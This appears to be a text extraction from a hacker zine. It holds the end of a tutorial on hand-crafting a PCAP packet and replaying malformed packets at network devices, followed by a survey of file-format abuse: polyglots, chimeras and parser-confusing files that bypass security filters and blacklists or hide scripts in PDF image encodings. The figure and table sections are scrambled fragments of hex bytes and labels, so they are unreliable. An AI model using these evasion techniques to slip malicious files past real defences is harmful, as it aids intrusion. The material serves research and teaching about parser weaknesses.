10 Yes, neighbors, it is an OSI layering violation—and it has been extracting its cost, in sweat, blood, and 0day. And if you
think you are properly scared, you are not scared enough—just think of that SCADA protocol that has kept your neighborhood’s
lights on, so far. –PML
9 But
15We will use the PCAP format, the most common format of packet capture tools.
A PCAP starts with 24 bytes of global file-scope metadata and another 16 bytes of per-packet meta-
data. The first six of PCAP’s 4-byte fields are the magic number (0xA1B2C3D4), the PCAP version (2.4,
so 0x00020004), the timezone (GMT, so 0x00000000), the sigfigs field 11 (0x00000000), the snaplen 12
(0x0001000F) and the network’s data link type 13 (Ethernet: 0x00000001).
So our global header will be A1B2C3D40002000400000000000000000001000F00000001. Fun fact: revers-
ing the order of the magic number to 0xD4C3B2A1 will change the endianness of the PCAP metadata—alerting
your packet analyzer that the order of bytes in the capture file from another system should be reversed.
The per-packet data consists of four 4-byte fields: time, microtime, packet length, and captured length.
Let’s set the time to default day (0x4EBD02CF) and zero out the microtime (0x00000000). Our packet length
will be 0x00000004B, and we’ll repeat the same value for the capture length.
Saving the pcap. Below you see a massively ugly command. We are echoing all of the above hex data
in order, starting with the PCAP file’s global metadata and following with the packet data. There isn’t a
single byte of this that we didn’t discuss above; it’s all there. We pipe it through xxd and use the -r and
-p arguments to convert it from hex to actual binary data (-p tells xxd to expect a continuous hexdump
without per-line addresses or offsets, rather than the standard xxd output; any whitespace including line
breaks is ignored in this mode). Say hello to lol.pcap:
echo A1B2C3D4 00020004 00000000 00000000 0001000F 00000001 \
4EBD02CF 00000000 0000004B 0000004B \
\
12345678 9ABC3133 37313337 0800 \
\
45 00 003D 1337 4 000 8C 06 5830 C0A80101 C0A80102 \
\
1337 01BB 00000000 00000000 8 0 18 0000 9C53 0000 \
01 01 08 0A DEADBEEF FFFFFFFF \
\
D796C34F4FC7E3C6D6 | xxd -r -p > lol.pcap
Now that you have a PCAP (see also Fig. 1), you can open it up in Wireshark and select each field in
the Packet Details section to see the corresponding hex data in the Packet Bytes section. If you want to
send a hand-crafted packet over your network, just replay it with something like
sudo tcpreplay -i eth0 lol.pcap
Hack around, change some bytes, and see what happens. Do impossible things, like setting the IPv4
layer’s first byte to 0x43, which specifies an IPv4 packet with a 12-byte IP header. This means the IP header
doesn’t have room for its own IP addresses. What will your little Linksys box do when it gets such a packet?
What will your newest shiny box with that fruit logo do? And how much do you dare trust that penguin,
really? Well, there is—and there has ever been—only one way to find out :)
11 In
theory, this is the accuracy of time stamps in the capture; in practice, typically set to zero.
is the maximum length of captured packets, in octets, or zero for no limit.
13 man 7 pcap-linktype (from libpcap0.8-dev or equivalent)
12 This
160
15
31
47
pcap version
magic number
A1
B2
C3
D4
00
02
00
00
00
00
00
snaplen
00
01
00
BD
0F
00
00
00
34
02
CF
00
31
Ver.n IHL ToS
45 00
TTL Protocol
8C 06
00
00
4B
00
00
00
56
33
78
9A
00
BC
A8
37
08
Source Port
13
37
13
3D
Header Checksum
30
C0
02
00
Checksum
Sequence Number
Destination Port
BB
Acknowledgment Number
00
00
33
00
DOff Reserv.
00
80
00
00
U A P R S F
R C S S Y I
G K H T N N
18
Urgent pointer
00
Window
00 00
Options
9C 53 00 00 01 01 08 0A
DE AD BE EF FF FF FF FF
Raw
D7
96
C3
4F
4F











 PCAP
global


metadata














 PCAP
per-packet


metadata








 Data
Link


Layer




Fl. Fragment Offset 





37
40
00





Source Address
Network
Layer

A8
01
01










00
01
31
00
Identification
01
4B
NLP
Total Length
58
00
Source MAC
Destination Address
C0
01
captured length
Source MAC Continued
37 00
00
Destination MAC
12
00
microtime
packet length
00
04
data link type
time
4E
00
sigfigs
timezone
00
63
C7
E3
C6














Transport
Layer


















D6
Figure 1: Crafted PCAP
17
Payload6
Abusing file formats; or,
Corkami, the Novella
by Ange Albertini
First, you must realize that a file has no intrinsic meaning. The meaning of a file—its type, its validity,
its contents—can be different for each parser or interpreter.
Like beef cuts, which vary with the country’s standards by which the animal is cut, a file is subject to
interpretations of the standard. The beauty of standards is that there are so many interpretations to choose
from!
Because these standards are sometimes unclear, incomplete, or difficult to understand, a variety of abuses
are possible, even if the files are considered valid by individual parsers.
A Polyglot is a file that has different types simultaneously, which may bypass filters and avoid security
counter-measures. A Schizophrenic file is one that is interpreted differently depending on the parser. These
files may look innocent (or corrupted) to one interpreter, malicious to another. A Chimera is a polyglot
where the same data is interpreted as different types, which is a more advanced kind of filter bypass.
This paper is a classification of various file techniques, many of which have already been mentioned in
previous PoCs and articles. The point here is to have an overview and comparison of them, not to necessarily
explain again all of them in detail.
6.1
Identification
It’s critical for any tool to identify the file type as early and reliably as possible. The best way for that is to
enforce a unique, not too short, fixed signature at the very beginning. However, these magic byte signatures
may not be perfectly understood, leading to some possible problems.
Most file formats enforce a unique magic signature at offset zero. It’s typically—but not necessarily—four
bytes. Office documents begin with DO CF 11 E0, ELF files begin with 7F E L F, and Resource Interchange
File Format (RIFF) files begin with R I F F. Some magic byte sequences are shorter.
Because JPEG is the encoding scheme, not a file format, these files are defined by the JPEG File
Interchange Format or JFIF. JFIF files begin with FF D8, which is one of the shortest magic byte sequences.
This sequence is often wrongly identified, as it’s typically followed by FF E0 for standard header or FF E1
for metadata in an EXIF segment.
BZIP2’s magic signature is only sixteen bits long, B Z. However it is followed by the version, which is
only supposed to be h, which stands for Huffman coding. So, in practice, BZ2 files always start with the
three-byte sequence B Z h.
A Flash video’s magic sequence is three bytes long, F L V. It is followed by a version number, which is
always 0x01, and a mask for audio or video. Most video files will start with F L V 01 05.
Some magic sequences are longer. These typically add more characters to detect transfer errors, such as
FTP transfers in which ASCII-mode has been used instead of binary mode, causing a translation between
different end–of–line conventions, escaping, or null bytes.
Figure 2: Brazilian and French beef cuts.
18Portable Network Graphic (PNG) files always use a magic that is eight bytes long, 89 P N G 0D 0A 1A 0A.
The older, traditional RAR file format begins with R a r ! 1A 07 00, while the newer RAR5 format is one
byte longer, R a r ! 1A 07 01 00.
Some magic signatures are obvious. ELF (Executable & Linkable Format), RAR (Roshal Archive), and
TAR (Tape Archive) all use their initials as part of the magic byte sequence.
Others are obscure. GZIP uses 1F 8B. This is followed by the compression type, the only correct value
for which is 0x08 for Deflate, so all these files are starting with 1F 8B 08. This is derived from Compress,
which began to use a magic of 1F 8D in 1984, but it’s not clear why this was chosen.
Some are chosen for vanity. Philipp Katz placed his initials in ZIP’s magic value of P K, while Fabrice
Bellard chose 0xFB for the BPG file format.
Some use L33TSP34K sequences, such as D0 CF 11 E0, CA FE BA BE, and CA FE FE ED. It looks cool,
but there are not so many words that can be encoded as hex. There aren’t so many collisions, but the
most common one is of course CA FE BA BE, which is used for Java .CLASS and Universal Mach-O. These
are easy to tell apart right after the magic, however. In a Mach-O, the magic signature is followed by
the number of architectures as a big-endian DWORD, which means such a fat binary usually starts with
CA FE BA BE 00 00 00 02 to indicate support for x86 and PowerPC, just two of the twenty supported
architectures. 14 . Conversely, a Java Class puts minor and major version numbers right after the magic, and
major_version should be greater than or equal to 0x2D, which indicated JDK 1.1 from 1997. 15
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Some file formats can be seen as high-level containers, with vastly differing internal file formats. For
example, the Resource Interchange File Format (RIFF) covers the AVI video container, the WAV audio
container, and the animated image ANI. Thus three different file types (video, audio, animation) are relying
on the same outer format, which defines the magic that will be required at offset zero.
Encodings
Some file formats accept different encodings, and each encoding uses a different Magic signature.
TIFF files can be either big or little endian, with I I indicating Intel (little) endianness and M M for
Motorola (big) endianness. Right after the signature is the number forty-two encoded as a 16–bit word—
00 2A or 2A 00 depending on the endianness—so the different magics feel redundant! A common T I F F
magic before this endianness marker would have been good enough.
32–bit Mach–O files use FE ED FA CE, while 64–bit Mach–O files use FE ED FA CF. The next two fields
also imply the architecture, so a 32–bit Mach-O for Intel typically starts with FEEDFACE 00000007 00000003,
while a 64–bit file starts with FEEDFACF 01000007 80000003, defining a 64b magic, ABI64 architecture, and
Lib64 as a subtype.
Flash’s Small Web Format originally used the F W S magic, then its compressed version used the C W S
magic. More recently, the LZMA–compressed version uses the Z W F magic. Once again, it doesn’t make
sense as the signatures are always followed by a version number. A higher bit could have been set to define
the compression if that was strictly necessary. In practice, however, it turns out that there is rarely a check
for these values. Why do they bother defining a version number and file size if it just works with any value?
While most file formats enforce their magic at offset zero, it’s common for archive formats to NOT
enforce magic at the start of an archive. 7ZIP, RAR, and ZIP have no such requirement. However, some
Unix compressors such as GZIP and BZIP2 do demand proper magic at offset zero. These are just designed
to compress data, with the filename being optional (for GZIP) or just absent (BZIP2).
Specific Examples
TAR, the Tape Archive format, was first used to store files via tape. It’s block-based, and for each file,
the header block starts with the filename. The magic signature, depending on the exact version of TAR,
14 http://tinyurl.com/MachO-fat-header
15 http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.1
19is present at offset 0x100 of the header block. The whole header contains a checksum for itself, and this
checksum is enforced.
PDF in theory should begin with a standard signature at offset zero, % P D F - 1 . [0-7], but in
practice this signature is required only to be within the first kilobyte. This limit is odd, which is likely the
reason why some PDF libraries don’t object to a missing signature. PDF is actually parsed bottom–up for a
complete document interpretation to allow for incremental document modifications. Further, the signature
doesn’t need to be complete! It can be truncated, either to %PDF-1. or %PDF\0.
ZIP doesn’t require magic at offset zero, and like PDF it’s parsed from the bottom up. In this case,
it’s not to allow for incremental updates; rather, it’s to limit those time–consuming floppy swaps when a
multi–volume archive is created on the fly, on external storage. The index structure must be located near
the end of the file.
Even more confusingly, it’s common that viewers and the actual extractor will have a different threshold
regarding the distance to the end of file. WinRar, for example, might list the contents of an archive without
error, but then silently fail to extract it!
Although standard ZIP tolerates not starting at offset zero or not finishing at the last offset, some variants
built on top of the ZIP format are pickier. Keep this in mind when creating funky APK, EGG, JAR, DOCX,
and ODT files.
Bad Magic Signatures
OpenType fonts start with 00 01 00 00, which is actually not a magic signature, but a version number,
which is expected to be constant. How pointless is that?
Windows icons (ICO) and static cursors (CUR) are using the same format. This format has no official
name, but it always has a magic of 00 00.
6.2
Hardware Formats
Hardware-oriented formats typically have no header. They are designed for efficiency, and their parser is
implemented in hardware. They are seen not as files, but as images burned into a ROM or similar storage.
They are directly read (and executed/interpreted) by a CPU, which often specifies critical data at the very
first offsets.
For example, floppy disks and hard disks begin with a 512–byte Master Boot Record (MBR) of executable
code that must end with 0xAA55. Video game console ROMs often begin with the initial stack pointer and
program counter. The TGA image format, which was designed in 1984 as a raster image format to be read
directly by a graphics board, begins with the image’s width and height. (Version 2 of TGA has an optional
footer, ending with a constant signature.)
However, it’s also common that some extra constant structure is required at a specific offset, later in the
memory space. These requirements are often enforced in software by the BIOS or bootloader, rather than
by a hardware check. For example, a Megadrive (Genesis) cartridge must have the ASCII string “SEGA” at
offset 0x100. 16 A Gameboy ROM must contain the Nintendo logo for its startup screen from offset 0x104
to 0x133, one of the longest signatures required in any file format. 17 Super NES ROMs have a header later
in the file, called the Cartridge Header. The exact offset of this header varies by the type of ROM, but it is
always far enough into the header that polyglot ROMs are easy to create. 18 Examples of such polyglots are
shown in Figures 3 and 4.
Abusing File Signature
Obviously, there is no room for abusing signatures as long as the content and the offset of the signatures are
strictly enforced. Signature abuse is possible when parsers are trying to recover broken files; for example,
16 http://wiki.megadrive.org/index.php?title=TMSS
17 http://problemkaputt.de/pandocs.htm#thecartridgeheader
18 http://problemkaputt.de/fullsnes.htm
20Figure 3: Sega Master System, Gameboy Color & PDF Polyglot
some PDF readers don’t require the presence of the PDF signature at all!
Header abuse is also possible when the specification is incorrectly implemented. For example, the Game-
Boy Pocket—and only the GameBoy Pocket—doesn’t bother to fully check the BIOS signature.
Blacklisting
As hinted previously, PDF can be easily abused. For security reasons, Adobe Reader, the standard PDF
reader, has blacklisted known magic signatures such as PNG or PE since version 10.1.5. It is thus not
possible anymore to have a valid polyglot that would open in Adobe Reader as PDF. This is a good security
measure even if it breaks compatibility with older releases of PoCkGTFO.
However, it’s critical to blacklist the actual signature as opposed to what is commonly appearing in files.
JPEG File Interchange Format (JFIF) files typically start with the signature, SOI, and an APP0 segment,
which make the file start with FF D8 FF E0. However, the signature itself is only FF D8, which can lead to a
blacklist bypass by using a different segment or different marker right after the signature. I abused this trick
to make a JPEG/PDF polyglot in PoCkGTFO 0x03, but since then, Adobe has fixed their JFIF signature
parsing. As such, pocorgtfo03.pdf doesn’t work in versions of Adobe Reader released since March of 2014.
Of course, blacklisting can only affect current existing formats that are already widespread. The Z W S
signature that we used for PoCkGTFO 0x05 is now blacklisted, but the BPG signature used in PoCkGTFO
0x07 is very recent so it has not been blacklisted yet. Moreover, each signature to be blacklisted has to be
added manually. Requiring the PDF signature to appear earlier in the file—even just in the first 64 bytes
21instead of a whole kilobyte—would proactively prevent a lot of polyglot types, as most recent formats are
dense at the start of the file. Checking the whole signature would also make it even harder, though not
respecting your own standard even for checking signatures is an insult to every standard.
6.3
File Format Structures
Most file formats are either chunk-based or pointer-based. Chunked files are often some variant of Tag/Length-
/Value (TLV), which are versatile and size-efficient. Pointer-based files are better adapted to direct memory
mapping. Let’s have some fun with each.
Chunk Sequences
The information is cut into chunks, which all have the same top-level structure, often defining a type, via
a tag, then the length of the chunk data to come, then the chunk content itself, of the given length. Some
formats such as PNG also require their chunks to end with a checksum, covering the rest of the chunk. (In
practice, this checksum isn’t always enforced.)
For even more space efficiency, BZIP2 is chunk based, but at the bit level! Bytes are never padded, and
structures are not aligned. It doesn’t waste a single bit, but for that reason it’s damned near unreadable
with a standard hex viewer. Because no block length is pre-encoded, block markers are fairly big, taking 48
bits. These six bytes, if they were aligned, would be 31 41 59 26 53 59, the BCD representation of π.
Structure Pointers
The first structure containing the magic signature points to the other structures, which typically don’t lie
immediately after each other. Pointers can be absolute as in file offsets, or relative to the current structure’s
offset or to some virtual address. In many cases, relative pointers are unsigned. Typically, executable images
use such pointers for their interrupt tables or entry points.
In many chunk-based formats such as FLV, you can inflate the declared size of a chunk without any
warnings or errors. In that case, the size technically behaves as a relative pointer to the next chunk, with a
lower limit.
6.4
Abusing File Format Structures
Empty Space
Block-sized formats, such as ISO, 19 TAR, and ROM dumps often contain a lot of extra space that can be
directly abused.
In theory, it may look like TAR should have lots of zero bytes, but in practice, it’s perfectly fine to have
one that’s 7–bit ASCII! This makes it possible to produce an ASCII abstract that is a valid TAR. For good
measure, the one shown in Figure 5 is not only an ASCII TAR, but also a PDF. The ASCII art comes free.
19 PoCkGTFO
0x05
22Appended Data
Since many formats define an end marker, adding any data after is usually tolerated: after all, the file is
complete, parsing can end successfully. However, it’s also easy for them to check if they reached the end of
the file: in this case (such as BPG or Java Class), no appended data is tolerated at all.
Trailing Space
Metadata fields are often null-terminated with a maximum length. This gives us a bit of controllable space
after the null character. That way, one could fit a PDF signature and stream declaration within the metadata
fields of a NES Sound Format (NSF) to get a working polyglot.
This is shown in Figure 6, where the NSF’s Title is “SSL Smiley song :-)\0%PDF-1.5”. Similarly,
the Author is “Melissa Eliott\0 9 0 obj <<<>>%” and the Copyright is “2014 0xabad1dea"\0 \n
stream \n”.
The original metadata is preserved, while declaring a PDF file and a dummy PDF object that will cover
the rest of the data of the NSF file.
Non-Critical Space
Some fields are required by a standard, but the parsers will forgive us for violations of the standard. These
parsers try to recover information out of corrupt files rather than halting on invalid structures.
JFIF is a clear example. Many JFIF segments clearly define their length, however nothing prevents you
from inserting extra data at the end of one segment. This data may be ignored, and the parser will just look
for the next segment marker. Since JFIF specifies that all segments are made of FF followed by a non-null
byte, as long as your extra data doesn’t encode a segment marker for a known segment type, you’re fine.
Known types include Define Quantization Table FF DB, Define Huffman Table FF C4, Start Of Scan FF DA,
and End Of Image FF D9.
In console ROMs, CPU memory space often starts with interrupt vector tables. You can adjust the
handler addresses to encode a useful value, or sometimes use arbitrary values for unused handlers.
Making Empty Space
In a chunk-structured format, you can often add an auxiliary chunk to carve extra space. Forward compat-
ibility makes readers fully ignore the extra chunk. Figure 7 shows a PNG whose “duMb” chunk happens to
contain valid PCM audio.
Sometimes, you have to flip a bit to enable structure space that can be abused. Examples include the
512–byte training buffer in the iNES (.nes) ROM format, which is used to hold code for enabling cheats.
23Figure 4: Sega Megadrive, Super Nintendo & PDF Polyglot
Figure 5: PDF, TAR Polyglot in 7–bit Clean ASCII
24Figure 6: PDF and NES Sound Format polyglot
Figure 7: PNG whose “duMb” chunk contains PCM Audio
25Figure 8: BPG/HTML/PDF Polyglot. ZIP not shown.
26A PDF/ZIP/BPG/HTML polyglot BPG 20 stands for Better Portable Graphics. It was recently
created as an alternative to JPG, PNG, and GIF. BPG images can be lossy or lossless. The format supports
animation and transparency.
To give BPG more exposure, this issue is a PDF/ZIP/BPG/HTML polyglot. Also, we’re running out of
formats that Adobe hasn’t blacklisted as polyglots.
BPG’s structure is very compact. Some fields’ bits are split over different bytes, most numerical values
are variable–length encoded, and every attempt is made to avoid wasted space. Besides the initial signature,
everything is numerical. ‘Chunk types’—called ‘extension tags’—are not ASCII like they commonly are in
PNG. Information is byte-aligned, so the format isn’t quite so greedily compressed as BZIP2.
BPG enforces its signature at offset zero, and it is not tolerant to appended data, so the PDF part must
be inside of the BPG part. To make a BPG polyglot, enable use the extension flag to add your own extension
with any value other than 5, which is reserved for the animation extension. Now you have a free buffer of
an arbitrary length.
Since the author of BPG helpfully provides a standalone JavaScript example to decompress and display
this format, a small page with this script was also integrated in the file. That way the file is a valid BPG,
a valid PDF, and a valid HTML page that will display the BPG image. You just need to rename the
pocorgtfo07.pdf to pocorgtfo07.html. You can see this in Figure 8.
Thanks to Mathieu Henri for his help with the HTML part.
Moving Structures Around In a pointer-chained format, you can often move structures around or even
inside other structures without breaking the file. These parsers never check that a structure is actually after
or outside another structure.
Technically-speaking, an FLV header defines its own size as a 32–bit word at offset 0x05, big endian.
However nothing prevents you from making this size bigger than used by Flash. You can then insert your
data between the end of the real header and the beginning of the first header packet.
To make some extra space early in ROMs, where the code’s entrypoint is always at a fixed address, just
jump over your inserted data. Since the jump instruction’s range may be very limited on old systems, you
may need to chain them to make enough controllable space.
Structure Order
To manipulate encryption/decryption via initialization vector, one can control the first block of the file to be
processed by a block cipher, so the content of the file in this first block might be critical. It’s important then
to be able to control the chunk order, which may be against the specs, and against the abilities of standard
processing libraries. This was used as AngeCryption in PoCkGTFO 0x03.
The minimal chunk requirements for PNG are IHDR, IDAT, and IEND. PNG specifies that the IHDR chunk
has to be first, but even though all image generators follow this part of the standard, most parsers fail to
enforce the requirement.
The same is true for JFIF (JPEG) files. The APP0 segment should be first, and it is always generated
in this position, but readers don’t really require it. In practice, a JFIF file with no APPx segments often
produces neither warnings nor errors. Figure 9 shows a functional JPEG that has no APPx segments, neither
a JFIF signature nor any EXIF metadata!
6.5
Data Encodings
It’s common for different file formats to rely on the same data encodings that have been proved reliable
and efficient, such as JPEG for lossy pictures or Deflate/Zlib. Thus it’s possible to make two different file
formats in the same file relying on the same data, stored with the same encoding.
20 http://bellard.org/bpg/
27Figure 9: JPEG with no APPx segments.
Figure 10: JPG/PDF/ZIP Chimera
28Offset
00014: Content
00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
FF D8
FF E0 00 10 .J .F .I .F 00 01 01 01 00 48
00 48 00 00
FF FE 02 1F
00018: %PDF-1.4
00140: 1 0 obj
...
20 0 obj
«/Length 69786»
stream
00000:
00002:
00168:
00181:
00186:
00221:
00235:
112B5:
112B7:
112BC:
1132B:
1132E:
1139A:
113A1:
PDF
ZIP
magic
header
comment segment
start (length)
PDF header
& document
dummy object start
.P .K 03 04
00 9B
endstream
endobj
dummy object end
5 0 obj
«/Width 400 ...
stream
FF D8 FF E0 00 10 .J .F .I .F 00 01 01 01 00
48 00 48 00 00
FF DB 00 43 ...
FF D9
FF FE 00 E6
local file header
start
filename length
lfh’s filename
(abused)
image object start
(end of comment)
image data (DQT)
end of image
segment comment
start (not strictly
req.)
image header stored file data
—
— —
—
endstream
endobj end of image object
24 0 obj
stream
... dummy object start
112DE:
1130C:
11317:
JPEG
central directory
.P .K
01 00
corkami.jpg
.P .K 05 06
75 00
endstream
endobj end of dummy
object
xref
...
%%EOF
%
FF D9 xref, trailer
filename (correct)
end of central
directory
length of comment
archive comment
end of file
line comment
end
of
marker
image
(end of line)
Table 1: JPG/PDF/ZIP Chimera Layout
29
(end of comment)Figure 11: TIFF/EXT2 Chimera
Abusing Data
JPG/PDF/ZIP Chimera For this kind of abuse, it’s important to see if what comes directly before the
data can be abused, and how the data offset can be abused.
A PDF directly stores JPG image and so does a ZIP archive using no compression, except that a ZIP’s
Local File Header contains a duplicate of the filename just before the file data itself.
Thus, we can create a single chimera that is at once a ZIP, a JPG, and a PDF. The ZIP has the JPEG
image as a JFIF file, whereas the whole file is also a valid JPEG image, and the whole file is also a PDF
that displays the image! Even better, we only have one copy of the image data; this copy is reused by each
of the forms of the chimera.
There are two separate JFIF headers. One is at the top of the file so that the JFIF file is valid, and a
duplicate copy is further in the file, right before the JPEG data, after the PDF header and the ZIP’s Local
File Header.
Other kinds of chimeras are possible. For example, it’s not hard to use TAR instead of ZIP as the outer
archive format. A neighbor could also use PNG (Zlib-compressed data, like in ZIP) instead of JPG.
One beautifully crafted example is the Image puzzle 21 proposed at the MIT Mystery Hunt 2015. It’s a
TIFF and an EXT2 filesystem where all the EXT2 metadata is visible in the TIFF data, and the filesystem
itself is a maze of recursive sub-directories and TIFF tiles. This is shown in Figure 11.
Abusing Data to Contain an Extra Kind of Information
Typically, RGB pixels of images don’t need to follow any particular rule. Thus it’s easy to hide various kinds
of data as fake image values.
This also works in PDF objects, where lossy compression such as JBIG2, CCITT Fax, and JPEG2000
can be used to embed malicious scripts. These are picture formats, but nothing prevents us from hiding
21 http://web.mit.edu/puzzle/www/2015/puzzle/image/
30Figure 12: Artistic, Valid QR Codes
Figure 13: Barcode–in–Barcode Inceptions
other types of information in them. PDF doesn’t enforce these encodings to be specifically used on objects
referenced as images, but allows them on any object, even JavaScript ones.
Moreover, image dimensions and depth are typically defined in the header, which tells in advance how
much pixel data is required, and appending any extra data within the pixel stream—such as in the IDAT
chunk of a PNG, which is Zlib-wrapped–will not trigger any problem with viewers. All the original pixels
are present, so the image is perfect, and the extra appended data in the pixel stream remains. This can be
used to hide data in a PNG picture without any obvious appended data after the IEND chunk.
Abusing Image Parsing
In some specific cases, such as barcodes, images are parsed after rendering. Even in extreme cases of barcode
manipulation, it’s still quite easy to see that they could be parsed as barcodes. The examples in Figure 12
come from a SIGGRAPH Asia 2013 paper by fine folks at the City College of London on Half-Tone QR
Codes. 22
However, we usually have no control over the scanning software. This software determines which types
of barcodes will be scanned, and in which order they will be parsed. By relying on error code information
recovery – and putting a different kind of barcode inside another one! – QR Inception is not only possible,
but was thoroughly investigated by the fine folks at SBA Research in Vienna! 23 Some quick examples are in
Figure 13.
Corrupting Data to Prevent Standard Extraction
Although many parsers may refuse to extract a corrupted stream, it’s possible that some will parse until
corruption is found and attempt to use the undamaged portion. By appending garbage data and corrupting
22 http://vecg.cs.ucl.ac.uk/Projects/SmartGeometry/halftone_QR/halftoneQR_sigga13.html
23 unzip
pocorgtfo07.pdf abusing_file_formats/qrinception.pdf #by Dabrowski et al
31Figure 14: ASCII Zlib Stream
Figure 15: JPEG-Encoded JavaScript
its encoding, we can create a stream that still contains its information, but will not be extracted by purist
tools!
Appending garbage, compressing, then truncating the last compressed block is a straightforward way
to do this with Zlib and Deflate. Using LZMA without End of Stream markers also works. As mentioned
before, you also get the same result by corrupting the CRC32 of a JAR. Most if not all ZIP extractors will
fail to open the archive, whereas Java itself will ignore and execute the classes just fine.
In a similar but a bit more unpredictable way, it looks like most Windows viewers open a PNG file with
corrupted checksums in critical chunks just fine. Most Linux viewers reject the file completely.
Abusing Encoding to Bypass Filter
ASCII Zlib Stream As Gabor Molnar proved with ascii-zip, 24 it’s possible to turn the Huffman coding
used in Zlib into an ASCII-only expansion, and thus send a Zlib-compressed binary as a standard ASCII
string. An ASCII gzip file using this trick is shown in Figure 14.
Michele Spagnuolo used this same trick in the better-known RosettaFlash attack, the details of which
you can find in PoCkGTFO 5:11.
Lossless JPEG We can abuse JPEG’s lossy compression and turn it lossless. Since it’s lossy by definition,
it makes sense to expect that it cannot be controlled, so it is often ignored by security software. But,
by encoding a greyscale JPEG, chrominance and luminance separation is fully predictable, as there is no
more chrominance. Combining this with either 100% quality compression or a specific quantization matrix
allows the decompressed data to be predictable and reusable! Dénes Óvári demonstrated PoC of this in
VirusBulletin 2015/03, 25 and an example of the technique is shown in Figure 15.
Altering Data to Contain Extra Information
Image and Sound When sound is stored as 32–bit PCM, the 16 lower bits can be modified without much
effect on the final sound as 16–bit resolution allows for a comfortable dynamic range of about 96 dB.
The BMP file format allows us to define both which color channels are stored, and on how many bits
those channels are stored. Thus, it’s possible to store a 16–bit picture as 32–bit words, leaving 16 bits of
each word unused! By combining these two techniques, we can mix picture and sound on the same words:
16 bits of audible sound, 16 bits of visible pixel colors. The sound is ignored for the picture, and the image
drops below the threshold of hearing.
24 https://github.com/molnarg/ascii-zip
25 unzip
pocorgtfo07.pdf abusing_file_formats/vb201503-lossy.pdf
32Figure 16: BMP Image with Another Image as RGB Channels in PCM Audio
Figure 17: Two Sound Files Combined, with Spectral Images
And if you’re cheeky, you can encode another picture in sound, that will be visible via spectrogram view.
Or encode some actual sound, with a banner picture encoded in the higher frequencies; this way, the sound
is still worth listening to yet also a thin picture is visible in the spectrogram view. 26
Sound and Sound Not only can you combine a BMP and PCM together, you can also encode two different
sound signals together by using different endianness and allowing the unchosen signal to drop beneath the
noise floor. 27
Figure 17 demonstrates a single file whose spectrogram is one image as big endian and a different image
as little endian. Note that the text in the left interpretation is in inaudibly high frequencies, so it can
peacefully coexist with music or speech in the lower frequencies.
Two Kinds of Schizophrenic PNGs In a similar way, by altering the Red/Green/Blue channels of each
pixel, one gets a similar image but with extra information.
In naive steganography, this is often used to encode external data on the least significant bits, but we
can also use this to encode one image within another image and create a schizophrenic picture!
Paletted image formats typically don’t require that each color in the palette be unique. By duplicating
the same sixteen colors over a 256–color palette, one can show the same image, but with extra information
stored by whatever copy of the palette index is used. (Original idea by Dominique Bongard, re-implemented
with Philippe Teuwen.)
26 http://wiki.yobi.be/wiki/BMP_PCM_polyglot
27 http://wiki.yobi.be/wiki/WAV_and_soft-boiled_eggs
33Figure 18: PNG with both Palette and RGB images from the Same Data
By combining both the redundant palette trick and the altered RGB components trick, we can store two
images. One image appears when the palette is taken into account, and the other appears when the palette
is ignored, and the raw RGB displayed. 28 Note that although an RGB picture with an extra palette isn’t
necessarily against the specs, there doesn’t seem to be any legitimate example in the wild. (Perhaps this
could be used to suggest which color to use to render on limited hardware?) As a bonus, the palette can
contain itself a third image.
A related technique involves storing two 16–color pictures in the same data by illegally including two
palettes. A PNG file having two palettes is against the specifications, but many viewers tolerate it. Some
parsers take the first palette into account, and some the last, which leads to two different pictures from the
same pixel information. This is shown in Figure 19, but unfortunately, most readers just reject the file.
(Screenshot by Thijs Bosschert.)
6.6
Schizophrenia
Semi-Constance
Constant Obstacles Make People Take Shortcuts. If most implementations use the same default
value, then some developer might just use this value directly hardcoded. If a majority of developers do
the same, then the variable aspect of the value would break compatibility too often, forcing the value to
be constant, equal to its default. Already in DOS time, the keyboard buffer was supposed to be variable-
sized( 29 ). It had a default start and size (40:1E, and 32 bytes), but you were supposed to be able to set a
different head and tail via (40:1A and 40:1C). However, most people just hardcoded 40:1E, so the parameters
for head and tail became not usable.
BMP Data Pointer A BMP’s header contains a pointer to image data. However, most of the time, the
image data strictly follows the headers and starts at offset 0x36. Consequently, some viewers just ignore that
pointer and just incorrectly display the data at offset 0x36 without paying attention to the header length.
So, if you put two sets of data, one at the usual place, and one farther in the file, pointed at from the
header, two readers may give different results. This trick comes from Gynvael Coldwind.
Unbalanced Nested Markers
It’s a well known fact that Web browsers don’t enforce HTML markers correctly. A file containing only
a<b>c will show a bold “c” despite the lack of <html> and <body> tags.
28 http://wiki.yobi.be/wiki/PNG_Merge
29 http://stanislavs.org/helppc/bios_data_area.html
34Figure 19: Schizophrenic PNG via Double Palettes, in Encase Forensic v7
Figure 20: Schizophrenic BMP with Non-Default Data Pointer
35Figure 21: One PDF, Two Interpretations
Figure 22: Schizophrenic PDF by Closed String Object (endobj)
In file formats with nested markers, ending these markers earlier than expected can have strange and
lovely consequences.
For example, PDF files are made of objects. An object is required to end with endobj. Some of these
objects contain a stream, which is required to end with endstream. As the stream is contained within the
object, endstream is expected to always come first, and then endobj.
In theory, a stream can contain the keyword endobj, and that should not affect anything. However, in
case some PDF generators should forget to close the stream before the object, it makes sense for a parser to
close the object even if the stream hasn’t been closed yet. Since this behavior is optional, different readers
implement it in different ways.
This can be abused by creating a document that contains an object with a premature endobj. This
sometimes confuses the parser by cloaking an extra root element different from the one defined in the trailer,
as illustrated by Figure 21. Such a file will be displayed as a totally different document, depending upon the
reader. Figure 22 shows such a schizophrenic PDF.
36Figure 23: Apple II & PDF Polyglot
6.7
Icing on the Cake
After modifying a file, there are checksums and other limitations that must be observed. As with any other
rule, there are exceptions, which we’ll cover.
ZIP CRC32 Most extractors enforce a ZIP file’s checksums, but for some reason Java does not when
reading JAR files. By corrupting the checksums of files within a JAR, you can make that JAR difficult to
extract by standard ZIP tools.
PNG CRC32 PNG also contains CRC32 checksums of its data. Although some viewers for Unix demand
correct checksums, they are nearly never required on Windows. No warnings, no nothin’.
TAR Checksum Tar checksums aren’t complicated, but the algorithm is so old–timey that it warms the
heart just a little.
Truecrypt Header A Truecrypt disk’s header is encrypted according to the chosen algorithm, password,
and keyfile. Prior to the header, the disk begins with a random 64–byte salt, allowing for easy manipulation
of headers. See my article on Truecrypt, PoCkGTFO 4:11, for a PDF/ZIP/Truecrypt polyglot.
6.8
Size Limitation
It’s common that ROM and disk images require a specific rounded size, and there is often no workaround to
